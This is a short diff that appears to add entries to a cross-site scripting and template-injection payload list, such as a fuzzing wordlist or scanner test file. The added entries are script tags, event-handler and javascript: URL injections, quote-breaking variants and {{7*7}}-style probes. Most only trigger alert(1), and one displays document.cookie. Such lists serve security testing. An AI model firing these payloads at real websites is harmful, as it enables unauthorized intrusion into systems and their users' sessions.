@@ -29,3 +29,17 @@
 <base href="javascript:alert(1)//">
 <form><button formaction=javascript:alert(1)>Click</button></form>
 <script>eval(atob('YWxlcnQoMSk='))</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+javascript:alert(1)
+<body onload=alert(1)>
+"><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+<iframe src=javascript:alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onchange=alert(1)><option>1</option></select>
+{{7*7}}
+${7*7}
+#{7*7}
+
